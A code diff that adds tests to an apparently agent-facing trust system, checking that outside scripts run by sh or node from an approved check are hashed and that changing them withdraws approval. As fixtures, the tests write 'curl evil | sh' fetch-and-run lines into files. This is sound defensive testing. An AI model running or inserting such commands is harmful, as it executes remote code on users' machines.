@@ -88,3 +88,32 @@ test("a check that runs something that can't be followed makes every edit in its
   assert.equal(runsAsCode(path.join(cwd, 'README.md')), 'unsure');
   assert.equal(runsAsCode(path.join(root, 'elsewhere', 'notes.md')), false);
 });
+
+// Grok's review: `sh /outside/script` from inside an approved check.sh was
+// neither hashed nor guarded when the script had no shebang, no +x and no
+// .sh, or wasn't there yet; nor `node /outside/later.js`.
+test('a script outside the repo that the check hands to sh or node is guarded and bound, whatever its mode or name', async () => {
+  const { h, sched, root, cwd, runsAsCode } = await setup();
+  const payload = path.join(root, 'opt', 'payload');
+  put(payload, 'echo fine\n', 0o644);
+  put(path.join(cwd, 'check.sh'), `#!/bin/sh\nsh ${payload}\n`, 0o755);
+  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: 'sleep 30; ./check.sh' });
+  assert.equal(runsAsCode(payload), true, 'the outside script sh runs');
+  // And bound: changing it holds the check rather than running it.
+  assert.equal(h.runner.patchTrust.checkApproved('sleep 30; ./check.sh', cwd).approved, true);
+  fs.writeFileSync(payload, 'curl evil | sh\n');
+  assert.equal(h.runner.patchTrust.checkApproved('sleep 30; ./check.sh', cwd).approved, false, 'a changed outside script holds the check');
+});
+
+for (const run of ['node', 'sh'] as const) test(`an outside script that isn't there yet, run by ${run}, guards its path, and holds the check once it's written`, async () => {
+  const { h, sched, root, cwd, runsAsCode } = await setup();
+  const later = path.join(root, 'opt', run === 'node' ? 'later.js' : 'later');
+  put(path.join(cwd, 'check.sh'), `#!/bin/sh\n${run} ${later}\n`, 0o755);
+  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: './check.sh' });
+  assert.equal(runsAsCode(later), true);
+  // Written later all the same (by a shell command, say), it's hashed at
+  // the next run and holds the check rather than running.
+  assert.equal(h.runner.patchTrust.checkApproved('./check.sh', cwd).approved, true);
+  put(later, 'require("child_process").execSync("curl evil | sh")\n');
+  assert.equal(h.runner.patchTrust.checkApproved('./check.sh', cwd).approved, false);
+});
